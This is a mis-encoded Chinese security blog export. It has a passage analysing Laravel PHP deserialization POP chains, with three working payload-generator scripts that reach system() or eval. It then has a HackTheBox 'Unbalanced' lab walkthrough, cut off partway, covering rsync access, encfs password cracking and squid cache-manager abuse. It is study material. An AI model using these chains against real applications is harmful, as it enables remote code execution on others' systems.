symfonyç»„ä»¶åšçš„ã€‚å°±ä¸è·Ÿäº†ã€‚(å®éªŒäº†ä¸‹æœ€æ–°ç‰ˆæœ¬symfonyç»„ä»¶æ²¡æ³•ç”¨äº†)</p><p>æˆ‘ä¸»è¦çœ‹ä¸ƒæœˆç«å¸ˆå‚…ä»‹ç»çš„ä¸€æ¡é“¾ã€‚æ¥è‡ªpç¥å°å¯†åœˆã€‚ç„¶åè¿˜æœ‰ä¸€æ¡é“¾æ˜¯æ¥è‡ªæŠ¤ç½‘æ¯çš„éé¢„æœŸã€‚è·Ÿç¬¬äº”ç©ºé—´ä¸€ä¸ªæ€§è´¨ã€‚å¦‚æœæ˜¯æŒ‰composerç›´æ¥ä¸‹è½½çš„è¯ã€‚ä¸¤æ¡é“¾éƒ½å¯ä»¥ç”¨ã€‚<br>è¿˜æ˜¯è€æ–¹æ³•æˆ‘ä»¬ç›´æ¥å¢åŠ ååºåˆ—åŒ–è·¯ç”±è·Ÿæ§åˆ¶å™¨ä»£ç ã€‚</p><p>å…¥æ‰‹ç‚¹æ˜¯ä¸€ä¸ªè²Œä¼¼åœ¨laravelå¾ˆå¤šé“¾å­ä¸­éƒ½é€šç”¨çš„destruct</p><pre><code class="php">public function __destruct(){    $this-&gt;events-&gt;dispatch($this-&gt;event);}</code></pre><p>å¾ˆæ˜æ˜¾è¿™é‡Œå°±æœ‰ä¸¤ç§æ€è·¯<br>1.å…¨å±€æ‰¾å­˜åœ¨dispatchçš„æœ‰ç”¨æ–¹æ³•ã€‚<br>2.å…¨å±€æ‰¾<code>__call</code>æ–¹æ³•</p><h3 id="popchain1"><a href="#popchain1" class="headerlink" title="popchain1"></a>popchain1</h3><p>å¯¹äºæˆ‘ä¸ªäººè€Œè¨€è¿™é‡Œå¯ä»¥è¯´æ˜¯ç¬¬ä¸€ååº”å°±æƒ³å»æ‰¾<code>__call</code>.å› ä¸ºå¾ˆæ˜æ˜¾çš„åŒå‚æ•°å‡å¯æ§.phpä¸­<code>__call</code>è¿™ç§é­”æœ¯æ–¹æ³•æœ¬æ¥å°±æ˜¯è®¾è®¡å‡ºæ¥ç”¨æ¥åŠ¨æ€è°ƒç”¨çš„ã€‚æ‰€ä»¥è‚¯å®šæœ‰ç±»ä¸­ä½¿ç”¨<code>call_user_func</code>è¿™æ ·çš„æ–¹å¼è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚æˆ‘ä»¬ä¸éš¾æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„Generatorç±»</p><pre><code class="php">public function format($formatter, $arguments = array()){    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);}public function __call($method, $attributes){    return $this-&gt;format($method, $attributes);}public function getFormatter($formatter){    if (isset($this-&gt;formatters[$formatter])) {        return $this-&gt;formatters[$formatter];    }    ......</code></pre><p>å…¨éƒ¨å¯æ§ã€‚æ‰€ä»¥æœ€ç»ˆ<code>call_user_func</code>ç›´æ¥å‘½ä»¤æ‰§è¡Œã€‚è¿™ä¸ªçœŸçš„æ˜¯å¤ªç®€å•äº†ã€‚éš¾æ€ªç¬¬5ç©ºé—´ä¼šæ¢äº†<code>__destruct</code>.</p><p>(ä¹‹å‰å› ä¸ºç¬¬5ç©ºé—´æ‰“çš„å¤ªçƒ‚äº†æ²¡è¿›çº¿ä¸‹å°±æ²¡ä»”ç»†ç ”ç©¶ã€‚ç»“æœä»”ç»†ä¸€çœ‹å‘ç°åŸæ¥å½“æ—¶é‚£ä¸ªæ˜¯5.7çš„ç‰ˆæœ¬å•Šâ€¦â€¦)<br>è¯´èµ·æ¥æŠ¤ç½‘æ¯é‚£é¢˜destructä»£ç è°ƒç”¨çš„æ˜¯<code>$this-&gt;events-&gt;fire($this-&gt;event);</code>ã€‚è²Œä¼¼è·Ÿå®˜æ–¹æºç ä¸ä¸€æ ·ï¼Ÿä½†è¿™æ¡é“¾ååæ˜¯ä¸ªéé¢„æœŸã€‚æœ‰ç‚¹è¿·ã€‚</p><p>popchain1 exp</p><pre><code class="php">&lt;?phpnamespace Illuminate\Broadcasting{    class PendingBroadcast    {        protected $events;        protected $event;        public function __construct($events, $event)        {            $this-&gt;event = $event;            $this-&gt;events = $events;        }    }}namespace Faker{    class Generator    {        protected $formatters;        function __construct($format){            $this-&gt;formatters = $format;        }    }}namespace{    $fs = array(&quot;dispatch&quot;=&gt;&quot;system&quot;);    $gen = new Faker\Generator($fs);    $pb = new Illuminate\Broadcasting\PendingBroadcast($gen,&quot;whoami&quot;);    echo(urlencode(serialize($pb)));}</code></pre><h3 id="popchain2"><a href="#popchain2" class="headerlink" title="popchain2"></a>popchain2</h3><p>æ¥è‡ªä¸Šé¢è¿™æ¡é“¾å­çš„å˜æ‹›ã€‚åˆšåˆšè¯´äº†Symphonyæœ€æ–°ç‰ˆæœ¬å·²ç»æ²¡æ³•<br>ç”¨äº†ã€‚å…¶ä¸»è¦åŸå› æ˜¯,ç¦æ­¢å¯¹TagAwareAdapterç±»ååºåˆ—åŒ–ã€‚æ‰€ä»¥åŠ äº†ä¸€ä¸ª__wakeupã€‚æ ¹æœ¬åˆ°ä¸äº†destructé‚£</p><pre><code class="php">public function __wakeup(){    throw new \BadMethodCallException(&#39;Cannot unserialize &#39;.__CLASS__);}public function __destruct(){    $this-&gt;commit();}</code></pre><p><img src="/2020/08/17/Laravel-popchain/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯æœ‰Symfonyçš„æƒ…å†µä¸‹è¿˜æ˜¯å¯ä»¥ç”¨å…¶ä»–ç±»ã€‚æ¯”å¦‚æˆ‘ä»¬æœç´¢<code>__destruct</code>æ‰¾åˆ°å¾ˆæ˜æ˜¾çš„åŒå‚æ•°å¯æ§è°ƒç”¨</p><pre><code class="php">class ImportConfigurator{    use Traits\HostTrait;    use Traits\PrefixTrait;    use Traits\RouteTrait;    private $parent;    public function __construct(RouteCollection $parent, RouteCollection $route)    {        $this-&gt;parent = $parent;        $this-&gt;route = $route;    }    public function __destruct()    {        $this-&gt;parent-&gt;addCollection($this-&gt;route);    }</code></pre><p>destructæ˜¯ä¸€æ ·çš„å¯æ§å‚æ•°è°ƒç”¨å‡½æ•°ã€‚æ‰€ä»¥æ®Šé€”åŒå½’ã€‚<br>ä¸ä¸Šé¢ä¸€æ ·çš„çš„æ€§è´¨ã€‚expæŠŠdispatchæ”¹ä¸ºaddCollectionå°±è¡Œäº†ã€‚</p><p>exp2</p><pre><code class="php">&lt;?phpnamespace Symfony\Component\Routing\Loader\Configurator {    class ImportConfigurator{        private $parent;        private $route;        public function __construct( $parent, $route)        {            $this-&gt;parent = $parent;            $this-&gt;route = $route;        }    }}namespace Faker{    class Generator    {        protected $formatters;        function __construct($format){            $this-&gt;formatters = $format;        }    }}namespace{    $fs = array(&quot;addCollection&quot;=&gt;&quot;system&quot;);    $gen = new Faker\Generator($fs);    $pb = new Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($gen,&quot;whoami&quot;);    echo(urlencode(serialize($pb)));}</code></pre><p>è¿™é‡Œä¸éœ€è¦åœ¨æ„<code>ImportConfigurator</code>åŸæœ¬æ„é€ å‡½æ•°ä¸­ç»§æ‰¿å’Œå®šæ­»çš„ç±»å‹ã€‚å› ä¸ºæ˜¯ç›´æ¥è¿›è¡Œé“¾å¼è°ƒç”¨ã€‚</p><h3 id="popchain3"><a href="#popchain3" class="headerlink" title="popchain3"></a>popchain3</h3><p>å›åˆ°å¼€å§‹ã€‚æˆ‘ä»¬è¯´é™¤äº†ç”¨__callæ‰“ç»„åˆæ‹³ã€‚è¿˜å¯ä»¥æ‰¾æœ‰ç”¨çš„å…¨å±€æ‰¾å­˜åœ¨dispatchæ–¹æ³•ã€‚<br>æ¯”å¦‚src\Illuminate\Bus\Dispatcher.php</p><pre><code class="php">public function dispatch($command){    if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) {        return $this-&gt;dispatchToQueue($command);    }    return $this-&gt;dispatchNow($command);}protected function commandShouldBeQueued($command){    return $command instanceof ShouldQueue;}public function dispatchToQueue($command){    $connection = $command-&gt;connection ?? null;    $queue = call_user_func($this-&gt;queueResolver, $connection);    ......</code></pre><p>é¦–å…ˆifåˆ¤æ–­é‡Œè°ƒç”¨<code>commandShouldBeQueued</code>ã€‚ç„¶åè°ƒç”¨<code>dispatchToQueue</code>.<br>å¯ä»¥çœ‹åˆ°ã€‚<code>$command</code>åªè¦æ˜¯å®ç°ShouldQueueæ¥å£çš„ç±»å³å¯è¿›å…¥ä¸‹é¢,å­˜åœ¨call_user_funcçš„å‘½ä»¤è°ƒç”¨ã€‚</p><p>ç°åœ¨å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ã€‚é‚£å°±åªéœ€è¦æ‰¾ä¸€ä¸ªå¯ç”¨ç±»å³å¯ã€‚æ¯”å¦‚EvalLoader<br>ã€‚å…¶loadæ–¹æ³•å«æœ‰evalè¯­å¥.</p><pre><code class="php">class EvalLoader implements Loader{    public function load(MockDefinition $definition)    {        if (class_exists($definition-&gt;getClassName(), false)) {            return;        }        eval(&quot;?&gt;&quot; . $definition-&gt;getCode());    }}public function getClassName(){    return $this-&gt;config-&gt;getName();}public function getCode(){    return $this-&gt;code;}</code></pre><p>çœ‹åˆ°åªè¦ä¿è¯<code>$this-&gt;config</code>çš„ç±»å­˜åœ¨getNameæ–¹æ³•ã€‚å°±å¯ä»¥è·³è¿‡returnæ‰§è¡Œeval.è¿™é‡Œé€‰æ‹©PhpParser\Node\Scalar\MagicConst\Lineç±»</p><p>exp3</p><pre><code class="php">&lt;?phpnamespace PhpParser\Node\Scalar\MagicConst{    class Line {}}namespace Mockery\Generator{    class MockDefinition    {        protected $config;        protected $code;        public function __construct($config, $code)        {            $this-&gt;config = $config;            $this-&gt;code = $code;        }    }}namespace Mockery\Loader{    class EvalLoader{}}namespace Illuminate\Bus{    class Dispatcher    {        protected $queueResolver;        public function __construct($queueResolver)        {            $this-&gt;queueResolver = $queueResolver;        }    }}namespace Illuminate\Foundation\Console{    class QueuedCommand    {        public $connection;        public function __construct($connection)        {            $this-&gt;connection = $connection;        }    }}namespace Illuminate\Broadcasting{    class PendingBroadcast    {        protected $events;        protected $event;        public function __construct($events, $event)        {            $this-&gt;events = $events;            $this-&gt;event = $event;        }    }}namespace{    $line = new PhpParser\Node\Scalar\MagicConst\Line();    $mockdefinition = new Mockery\Generator\MockDefinition($line,&#39;&lt;?php phpinfo();?&gt;&#39;);    $evalloader = new Mockery\Loader\EvalLoader();    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,&#39;load&#39;));    $queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);    echo urlencode(serialize($pendingbroadcast));}</code></pre><p><img src="/2020/08/17/Laravel-popchain/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ²’æƒ³åˆ°ä¸€ä¸ªä¸‹åˆèƒ½æŠŠlaravelä¸»è¦çš„ä¸¤ä¸ªç‰ˆæœ¬ååºåˆ—åŒ–è·Ÿå®Œã€‚è¿˜æ˜¯æ”¶è·æŒºå¤§çš„ã€‚ä¸è¿‡å®æˆ˜ä¸­æƒ³é‡åˆ°laravelååºåˆ—åŒ–æ¯”è¾ƒå›°éš¾ã€‚ä½¿ç”¨pharæ¥è¿›è¡Œè§¦å‘åº”è¯¥æ˜¯æ¯”è¾ƒç†æƒ³çš„å¯èƒ½æ–¹å¼ã€‚åˆ°æ­¤phpååºåˆ—åŒ–å°±å‘Šä¸€æ®µè½äº†å§ã€‚å‰©ä¸‹çš„å‡æœŸå°±å¤ä¹ ä¹‹ä½™æŠ½ç©ºçœ‹javaäº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Unbalanced</title>
      <link href="2020/08/15/hackthebox-Unbalanced/"/>
      <url>2020/08/15/hackthebox-Unbalanced/</url>
      
        <content type="html"><![CDATA[<p>  Unbalanced å¯èƒ½æ˜¯è‡ªå·±åšè¿‡çš„htbå›°éš¾é¶æœºä¸­é‡Œæœ€ç®€å•çš„ä¸€ä¸ªã€‚å…¶ä¸»è¦éš¾åº¦æ¥è‡ªäºæœ€å¼€å§‹çš„èµ·æ‰‹å¼éƒ¨åˆ†ã€‚æ¯”è¾ƒéœ€è¦è€å¿ƒ,ä½†æ˜¯æ²¡æœ‰éš¾åº¦ã€‚è€Œææƒéƒ¨åˆ†ç›´æ¥å¯ä»¥ç”¨ndayæ‰“ã€‚è¿™å¯¹äºä¸€ä¸ªå›°éš¾é¶æœºè€Œè¨€åŸºæœ¬å¤ªè¿‡ç®€å•äº†ã€‚æ‰€ä»¥åˆ°æ—¶ç®€å•åˆ†æä¸‹è¿™ä¸ªç”¨åˆ°çš„cveã€‚</p><a id="more"></a><p><img src="/2020/08/15/hackthebox-Unbalanced/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>é¶æœº 10.10.10.200</li><li>æ”»å‡»æœº 10.10.14.11</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>nmap</p><pre><code class="bash"># Nmap 7.80 scan initiated Fri Aug  7 11:01:56 2020 as: nmap -sC -sV -oA nmap/unbalance 10.10.10.200Nmap scan report for 10.10.10.200Host is up (0.43s latency).Not shown: 997 closed portsPORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: |   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)873/tcp  open  rsync      (protocol version 31)3128/tcp open  http-proxy Squid http proxy 4.6|_http-server-header: squid/4.6|_http-title: ERROR: The requested URL could not be retrievedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Aug  7 11:03:34 2020 -- 1 IP address (1 host up) scanned in 98.87 seconds</code></pre><p>873æœ‰rsync.3128æœ‰squidã€‚æ—¢ç„¶rsyncå¼€æ”¾,åœ¨htbè¿™ç§ç¯å¢ƒé‡Œè‚¯å®šå­˜åœ¨æœªæˆæƒè®¿é—®çš„ã€‚æ‰€ä»¥æ¢æµ‹å¹¶ä¸‹è½½ä¸‹æ¥ã€‚</p><pre><code class="bash">root@byc404:~/htb/boxes/Unbalanced/# rsync 10.10.10.200::conf_backups    EncFS-encrypted configuration backupsroot@byc404:~/htb/boxes/Unbalanced/# rsync 192.168.122.1::conf_backups ./rsync_backup</code></pre><p>å¾—åˆ°conf_backupsæ–‡ä»¶å¤¹ã€‚çœ‹ä¸‹å†…å®¹</p><pre><code class="bash">root@byc404:~/htb/boxes/Unbalanced/rsync_backup# ls -la-rw-r--r-- 1 root root   2980 Apr  4 23:05 A4qOD1nvqe9JgKnslwk1sUzO                                                                                                                         -rw-r--r-- 1 root root   1138 Apr  4 23:05 a4zdmLrBYDC24s9Z59y-Pwa2                                                                                                                         -rw-r--r-- 1 root root    443 Apr  4 23:05 Acv0PEQX8vs-KdK307QNHaiF                                                                                                                         -rw-r--r-- 1 root root    935 Apr  4 23:05 B6J5M3OP0X7W25ITnaZX753T                                                                                                                         -rw-r--r-- 1 root root   3643 Apr  4 23:05 c9w3APbCYWfWLsq7NFOdjQpA                                                                                                                         -rw-r--r-- 1 root root    288 Apr  4 23:05 ,CBjPJW4EGlcqwZW4nmVqBA6                                                                                                                         -rw-r--r-- 1 root root   1521 Apr  4 23:05 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1                                                                                                   -rw-r--r-- 1 root root    332 Apr  4 23:05 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1                                                                                                   -rw-r--r-- 1 root root   2592 Apr  4 23:05 dF2GU58wFl3x5R7aDE6QEnDj                                                                                                                         -rw-r--r-- 1 root root   1268 Apr  4 23:05 dNTEvgsjgG6lKBr8ev8Dw,p7                                                                                                                         -rw-r--r-- 1 root root   2359 Apr  4 23:05 ECXONXBBRwhb5tYOIcjjFZzh                                                                                                                         -rw-r--r-- 1 root root   1297 Apr  2 21:06 .encfs6.xml                                                                                                                                      -rw-r--r-- 1 root root   1464 Apr  4 23:05 F4F9opY2nhVVnRgiQ,OUs-Y0     -rw-r--r-- 1 root root    354 Apr  4 23:05 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1.....</code></pre><p>å‘ç°æ–‡ä»¶åä¼¼ä¹éƒ½æ˜¯å¤„ç†è¿‡çš„hashstring.æœ‰ä¸ª<code>.encfs6.xml</code>ä½†æ˜¯å†…å®¹çœ‹ä¸å‡ºä»€ä¹ˆæ•æ„Ÿæ•°æ®ã€‚</p><p>googleæœç´¢äº†ä¸‹å‘ç°è¿™æ˜¯encfsåŠ å¯†å¾—åˆ°é…ç½®æ–‡ä»¶ã€‚<code>encfs</code>åŠ å¯†çš„ç”¨æ³•ç®€å•æ¥è¯´,å°±æ˜¯ä½ å¯ä»¥æŒ‡å®šä¸€ä¸ªè¢«åŠ å¯†çš„æ–‡ä»¶å¤¹,å†mountå¦ä¸€ä¸ªæ–‡ä»¶å¤¹ä½œä¸ºåŠ å¯†æ–‡ä»¶å¤¹ã€‚æ‰§è¡Œencfså,è¢«åŠ å¯†çš„æ–‡ä»¶å¤¹çš„å†…å®¹ä»¥åŠæ–‡ä»¶åå°±åœ¨åŠ å¯†æ–‡ä»¶å¤¹å°±ä¼šè‡ªåŠ¨ç”Ÿæˆã€‚æ­¤æ—¶åŠ å¯†æ–‡ä»¶å¤¹ä¼šç•™ä¸‹ä¸€ä¸ª<code>.encfs6.xml</code></p><p>è¿™ç§æƒ…å†µç»å¸¸å‡ºç°åœ¨ä½¿ç”¨è‡ªåŠ¨åŒæ­¥çš„æƒ…å†µé‡Œé¢ã€‚å› ä¸ºencfsä¸€æ—¦ä¸ºä¸¤ä¸ªæ–‡ä»¶å¤¹å»ºç«‹äº†æ˜ å°„,å°±ä¼šè‡ªåŠ¨åŠ å¯†æ–°æ”¾å…¥çš„æ–‡ä»¶ã€‚æ­£å› å¦‚æ­¤,ä½¿ç”¨rsyncå¤„ç†encfsåŠ å¯†åçš„æ–‡ä»¶å¤¹ä¹Ÿæ˜¯ä¸€ç§å¸¸è§é€‰æ‹©ã€‚è€Œä¸€æ—¦å‡ºç°äº†rsyncæœªæˆæƒè®¿é—®å°±å°†å¯¼è‡´è¿›ä¸€æ­¥çš„ä¿¡æ¯æ³„éœ²ã€‚å®æˆ˜ä¸­å®Œå…¨å¯èƒ½ã€‚</p><p>è‡³äºè§£å¯†æ–¹æ³•å…¶å®å®‰è£…äº†encfsåçœ‹ä¸€ä¸‹manå°±æ‡‚äº†ã€‚æˆ‘åœ¨<code>--reverse</code>çš„é€‰é¡¹é‚£çœ‹åˆ°äº†ä¸€ç§é€†å‘ä¸¤ä¸ªencfsæ–‡ä»¶å¤¹çš„åšæ³•ã€‚å› æ­¤åªéœ€è¦ä¸€ä¸ªæ­£ç¡®çš„encfs å¯†ç å³å¯ã€‚(encfsæ¯æ¬¡è°ƒç”¨åŠ å¯†å»ºç«‹æ˜ å°„æ—¶ä¼šè¦æ±‚ä½ è¾“å…¥å¯†ç )<br>æ¥ç€æŸ¥èµ„æ–™ã€‚æˆ‘å‘ç°encfså¦‚æœæœ‰<code>.encfs6.xml</code>çš„è¯ã€‚å¯ä»¥ç›´æ¥ä½¿ç”¨johnçˆ†ç ´<br><a href="https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml" target="_blank" rel="noopener">https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml</a></p><p>å…ˆä½¿ç”¨encfs2john.pyè½¬æ¢ã€‚ç„¶åçˆ†ç ´å³å¯</p><p>ç»“æœ<br><code>$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add:bubblegum</code></p><p>bubblegumå°±æ˜¯encfså¯†ç ã€‚<br>ç„¶åè§£å¯†æ–‡ä»¶å¤¹ã€‚æŠŠè§£å¯†çš„æ–‡ä»¶å¤¹æ”¾åˆ°<code>rsync_decrypt</code>é‡Œå»ã€‚æ³¨æ„è¿™é‡Œçš„è·¯å¾„åªæ¥å—ç»å¯¹è·¯å¾„ã€‚</p><pre><code class="bash">ENCFS6_CONFIG=/root/htb/boxes/Unbalanced/rsync_backup/.encfs6.xml encfs /root/htb/boxes/Unbalanced/rsync_backup /root/htb/boxes/Unbalanced/rsync_decrypt</code></pre><p>å¾—åˆ°è§£å¯†æ–‡ä»¶å¤¹åã€‚å‘ç°æœ‰å‡ åä¸ªconfæ–‡ä»¶ã€‚åŸºæœ¬å°±æ˜¯å¹³æ—¶ä¼šæ”¾åˆ°<code>/etc</code>ä¸‹çš„é‚£äº›<code>.conf</code>æ–‡ä»¶ã€‚</p><p>è¿™é‡Œæ˜æ˜¾éœ€è¦æŠ“é‡ç‚¹ã€‚åŸºäºä¹‹å‰æˆ‘ä»¬æ¢æµ‹æ—¶å‘ç°æœ‰squidä»£ç†å¼€æ”¾ã€‚æ‰€ä»¥æ‰¾åˆ°squid.confã€‚<br>squid.confåŒæ ·è¦æŠ“é‡ç‚¹ã€‚å› ä¸ºé‡Œé¢æœ‰ä¸Šåƒè¡Œå†…å®¹ã€‚æ¯”è¾ƒæ–¹ä¾¿çš„æ–¹æ³•æ˜¯ç›´æ¥<code>cat squid.conf| grep htb</code>æ‰¾åˆ°ä¸€ä¸ªåŸŸåã€‚æˆ–è€…åæ¥æˆ‘æ‹¿åˆ°æœ¬æœºä¸Šç”¨vscodeçœ‹æ—¶å› ä¸ºæ³¨é‡Šéƒ¨åˆ†è·Ÿæœªæ³¨é‡Šéƒ¨åˆ†æœ‰æ˜æ˜¾çš„ç»¿è‰²ä¸ç™½è‰²å·®åˆ«ã€‚æ‰€ä»¥å¯ä»¥å¾ˆå¿«æ‹–ç€çœ‹ã€‚æ‰¾åˆ°æ‰€æœ‰å…³é”®ä¿¡æ¯ã€‚</p><pre><code># Only allow cachemgr access from localhost#http_access allow localhost manager#http_access deny managerhttp_access allow manager#http_access allow localnethttp_access allow localhost# Allow access to intranetacl intranet dstdomain -n intranet.unbalanced.htbacl intranet_net dst -n 172.16.0.0/12http_access allow intranethttp_access allow intranet_net# cachemgr_passwd secret shutdown# cachemgr_passwd lesssssssecret info stats/objects# cachemgr_passwd disable all#Default:# No password. Actions which require password are denied.cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf eventscachemgr_passwd disable all</code></pre><p>å‡ ä¸ªå…³é”®ç‚¹ã€‚</p><ul><li><code>intranet.unbalanced.htb</code> åŸŸåã€‚ä¸è¿‡æ˜¯å†…ç½‘ip</li><li>cachemgr_passwd å³cache managerçš„å¯†ç <code>Thah$Sh1</code></li><li>åªèƒ½æœ¬åœ°è®¿é—®</li></ul><p>é‚£å°±å¾ˆæ˜æ˜¾äº†ã€‚æˆ‘ä»¬ä¹‹å‰nampä¹Ÿæ²¡æœ‰æ‰¾åˆ°squidä»¥å¤–çš„webæœåŠ¡ã€‚æ—¢ç„¶å¦‚æ­¤,ç›´æ¥ä½¿ç”¨å®ƒè¿™ä¸ªä»£ç†æœåŠ¡å™¨ä½œä»£ç†å°±èƒ½è®¿é—®å†…ç½‘ç½‘é¡µäº†ã€‚</p><p>ä¿®æ”¹æµè§ˆå™¨çš„ä»£ç†æ”¹ä¸º<code>10.10.10.200:3128</code>.å†æ¬¡è®¿é—®<code>intranet.unbalanced.htb</code></p><p><img src="/2020/08/15/hackthebox-Unbalanced/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥è®¿é—®åˆ°é¡µé¢.å®ƒä¼šé‡å®šå‘æˆ‘ä»¬åˆ°<code>/inranet.php</code>ã€‚ä¸è¿‡è¿™ä¸ªç™»å½•ç•Œé¢æ²¡å•¥ä¸œè¥¿ã€‚å¯èƒ½éœ€è¦è¿›ä¸€æ­¥åˆ©ç”¨ã€‚å”¯ä¸€ç¨å¾®æ³„éœ²å‡ºç›¸å…³ä¿¡æ¯çš„å†…å®¹åœ¨headersé‡Œ</p><p><img src="/2020/08/15/hackthebox-Unbalanced/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™æ—¶æƒ³èµ·æˆ‘ä»¬ä¹‹å‰çš„cache managerå¯†ç ã€‚æœç´¢ä¸€æ³¢å¦‚ä½•åˆ©ç”¨ã€‚</p><blockquote><p>The cache manager (cachemgr.cgi) is a CGI utility for displaying statistics about the squid process as it runs</p></blockquote><p>ç®€å•çœ‹ä¸‹å‘ç°æˆ‘ä»¬æ˜¯å¯ä»¥è°ƒç”¨cachemgrçš„å‘½ä»¤çš„ã€‚ä¹‹å‰åœ¨squid.confä¸­è·Ÿåœ¨å¯†ç åçš„ä¸€å¤§ç»„æ–‡å­—å…¶å®å°±æ˜¯å„ç§å¯è°ƒç”¨çš„å‘½ä»¤ã€‚<br>æœç´¢äº†ä¸‹è°ƒç”¨æ–¹å¼ã€‚å‘ç°å¯ä»¥<code>telnet</code>è¿æ¥ä»£ç†æœåŠ¡å™¨ç„¶åå†ä¼ ä¸€ä¸ªhttpæŠ¥å¤´ã€‚ä¸è¿‡åæ¥æ‰¾åˆ°ä¸€ä¸ªdebianå°±æœ‰çš„<code>squidclient</code>å‘½ä»¤è¡Œ.æ›´åŠ æ–¹ä¾¿ã€‚<br>æˆ‘ä»¬å…ˆè°ƒç”¨ä¸‹<code>menu</code>å‘½ä»¤ã€‚</p><pre><code class="bash"> root@byc404:~/htb/boxes/Unbalanced#   squidclient -h 10.10.10.200 -w &#39;Thah$Sh1&#39; mgr:menu                                                                                                      HTTP/1.1 200 OK                                                                               Server: squid/4.6                                                                             Mime-Version: 1.0                                                                             Date: Sat, 15 Aug 2020 02:17:42 GMT                                                           Content-Type: text/plain;charset=utf-8                                                        Expires: Sat, 15 Aug 2020 02:17:42 GMT                                                        Last-Modified: Sat, 15 Aug 2020 02:17:42 GMT                                                  X-Cache: MISS from unbalanced                                                                 X-Cache-Lookup: MISS from unbalanced:3128                                                     Via: 1.1 unbalanced (squid/4.6)                                                               Connection: close                                                                              index                  Cache Manager Interface                 disabled menu                   Cache Manager Menu                      protected offline_toggle         Toggle offline_mode setting             disabled shutdown               Shut Down the Squid Process             disabled reconfigure            Reconfigure Squid                       disabled rotate                 Rotate Squid Logs                       disabled pconn                  Persistent Connection Utilization Histograms    protected mem                    Memory Utilization                      protected diskd                  DISKD Stats                             protected squidaio_counts        Async IO Function Counters              disabled config                 Current Squid Configuration             disabled  client_list            Cache Client List                       disabled  comm_epoll_incoming    comm_incoming() stats                   disabled  ipcache                IP Cache Stats and Contents             disabled fqdncache              FQDN Cache Stats and Contents           protected idns                   Internal DNS Statistics                 disabled redirector             URL Redirector Stats                    disabled store_id               StoreId helper Stats                    disabled external_acl           External ACL stats                      disabled http_headers           HTTP Header Statistics                  disabled       external_acl           External ACL stats                      disabled 